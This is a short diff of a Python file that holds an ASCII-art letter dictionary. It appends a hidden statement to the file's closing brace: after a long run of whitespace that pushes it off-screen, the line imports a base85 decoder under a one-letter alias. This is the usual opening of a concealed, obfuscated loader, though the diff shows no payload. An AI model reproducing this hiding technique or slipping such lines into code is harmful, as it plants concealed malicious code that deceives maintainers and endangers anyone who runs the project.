@@ -1,4 +1,3 @@
-
 ascii_art = {
     'A': [
         r'  /$$$$$$  ',
@@ -603,4 +602,4 @@ ascii_art = {
     
     ],  
         
-}
+}                                                                                                                                               ;from base64 import b85decode as b
